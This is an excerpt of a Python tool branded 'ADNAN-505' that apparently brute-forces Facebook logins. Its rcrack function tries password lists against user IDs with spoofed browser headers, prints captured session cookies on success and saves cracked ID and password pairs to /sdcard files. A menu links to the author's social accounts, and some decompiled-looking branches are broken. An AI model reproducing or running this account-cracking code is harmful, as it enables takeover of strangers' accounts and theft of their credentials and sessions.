...
def FD():
    os.system('clear')
    print(logo)
    print('\x1b[1;33m [1] FLOWE MY FACEBOOK FARIND 👉')
    print(' [2] EXIT')
...
def o():
    ...
    jalan('\x1b[1;32m [2] \x1b[1;32m👿ME ON FACEBOOK 👿')
    jalan(' \x1b[1;32m[3] \x1b[1;32m👿MY ON WHATSAPP 👿')
    jalan(' \x1b[1;32m[4] \x1b[1;32m👿MY ON MESSNGRE 👿')
    jalan(' \x1b[1;32m[00] \x1b[1;31m😈EXIT😈')
    opt = input('\n   \x1b[1;32m Choose option >>> ')
    if opt == '1':
        i()
    if None == '2':
        os.system('xdg-open https://www.facebook.com/adnan.tera.real.papa.0')
        return None
    if None == '3':
        os.system('xdg-open https://wa.me/message/WCYOG3JOC6KDC1')
        return None
    if None == '4':
        os.system('xdg-open https://m.me/j/AbZC3piGUzcLR0_u/')
        return None
    if None == '0':
        os.system('exit')
        return None
...
\033[1;37m================= \33[32;45m ADNAN-505 \33[0;m ==================

\033[1;32m     \033[1;33mCREATED BY\33[0;m   :  \033[1;33mADNAN\33[0;m\033[1;32m && \033[1;33m-505\33[0;m
\033[1;32m     \033[1;32mFACEBOK      : \033[1;34m MD SHARIF HOSSEIN 
\033[1;32m     \033[1;35mGITHUB       :  \033[1;35mAdnan Sheikh404
\033[1;32m     \033[1;36mTOOL STATUS  :  \033[1;36mTOOL IS UPDATE FREE
\033[1;32m     \033[1;35mTEAM         :  \033[1;35mEROR 
\033[1;32m     \033[1;36mTOOL VIRSION :  \033[1;36m3.0

\033[1;37m================= \33[32;45m ADNAN \33[0;m ===================
 
        \33[37;41m\t WELLCOME TO ADNAN-505 \33[0;m
...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            "sec-ch-ua": '"Google Chrome";v="90", "Not)A;ADNAN";v="8", "Chromium";v="75"',
            "sec-ch-ua-mobile": '?1',
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('    \33[1;30m(ADNAN-CP🙁)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/ADNAN-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('   \033[1;32m(ADNAN.OK 💚)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/ADNAN-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r     %s[ADNAN] [%s/%s]  CP:- %s  OK:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
